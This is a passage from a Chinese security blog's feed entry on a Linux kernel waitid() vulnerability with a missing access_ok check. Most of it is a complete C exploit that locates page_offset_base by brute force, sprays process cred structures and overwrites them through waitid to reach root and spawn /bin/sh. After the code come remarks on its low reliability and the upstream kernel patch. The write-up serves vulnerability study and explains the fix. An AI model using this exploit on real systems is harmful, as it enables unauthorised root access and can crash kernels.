class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">child_process</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         euid;</span><br><span class="line">    <span class="type">cpu_set_t</span>   mask;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(<span class="number">0</span>,&amp;mask);</span><br><span class="line">    sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(mask),&amp;mask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    size_t cred_addr;</span></span><br><span class="line"><span class="comment">    read(dev_fd, &amp;cred_addr, 8);</span></span><br><span class="line"><span class="comment">    printf(&quot;[*] child cred: %p\n&quot;, cred_addr);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        euid = geteuid();</span><br><span class="line">        <span class="keyword">if</span> (!euid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Successfully get the root!&quot;</span>);</span><br><span class="line">            setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="type">size_t</span>              cur_attack_addr;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">cpu_set_t</span>           mask;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(<span class="number">0</span>,&amp;mask);</span><br><span class="line">    sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(mask),&amp;mask);</span><br><span class="line">    </span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/a3device&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find page_offset_base</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;trying: %p\n&quot;, page_offset_base);</span></span><br><span class="line">            retval = waitid(P_PID, pid, page_offset_base, WEXITED);</span><br><span class="line">            <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            page_offset_base += <span class="number">0x10000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful found the \033[0mpage_offset_base\033[32m\033[1m at: \033[0m%p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cred spray</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] start cloning child process...\033[0m&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">void</span> *child_stack = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// a page</span></span><br><span class="line">        <span class="type">int</span> pid = clone(child_process, child_stack, CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SYSVSEM | SIGCHLD, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] failed to create enough child process!\033[0m&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// attacking</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] start finding child process...\033[0m&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>, cur_attack_addr = page_offset_base + <span class="number">0x6f500000</span>; <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// only 23 cred on a page</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">23</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            i = <span class="number">0</span>;</span><br><span class="line">            cur_attack_addr += <span class="number">0x1000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Attacking the: \033[0m%p\n&quot;</span>, cur_attack_addr + i * <span class="number">176</span>);</span><br><span class="line">        waitid(P_ALL, <span class="number">0</span>, cur_attack_addr + <span class="number">4</span> + i * <span class="number">176</span>, WNOHANG );</span><br><span class="line">        waitid(P_ALL, <span class="number">0</span>, cur_attack_addr + <span class="number">20</span> + i * <span class="number">176</span>, WNOHANG );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过这种方法<strong>纯靠猜测 cred 在内核地址空间中可能的位置并进行爆破</strong>，因此成功的机率并不是特别的高，且因为爆破过程中会覆写多个无关的内核数据结构，很容易造成 kernel panic，因此这个漏洞并不是特别容易进行利用</p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>这个漏洞修复的方式比较简单，只需要将缺失的 <code>access_ok()</code> 宏添加到 waitid 系统调用中即可，<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=96ca579a1ecc943b75beba58bebb0356f6cc4b51">Kees Cook 提交的 commit</a>便是如此修复的：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/kernel/exit.c b/kernel/exit.c</span></span><br><span class="line"><span class="comment">index f2cd53e92147c..cf28528842bcf 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/exit.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/exit.c</span></span><br><span class="line"><span class="meta">@@ -1610,6 +1610,9 @@</span> SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,</span><br><span class="line"> if (!infop)</span><br><span class="line"> return err;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))</span></span><br><span class="line"><span class="addition">+goto Efault;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> user_access_begin();</span><br><span class="line"> unsafe_put_user(signo, &amp;infop-&gt;si_signo, Efault);</span><br><span class="line"> unsafe_put_user(0, &amp;infop-&gt;si_errno, Efault);</span><br><span class="line"><span class="meta">@@ -1735,6 +1738,9 @@</span> COMPAT_SYSCALL_DEFINE5(waitid,</span><br><span class="line"> if (!infop)</span><br><span class="line"> return err;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))</span></span><br><span class="line"><span class="addition">+goto Efault;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> user_access_begin();</span><br><span class="line"> unsafe_put_user(signo, &amp;infop-&gt;si_signo, Efault);</span><br><span class="line"> unsafe_put_user(0, &amp;infop-&gt;si_errno, Efault);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;今晚别睡太死.jpg&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
</feed>
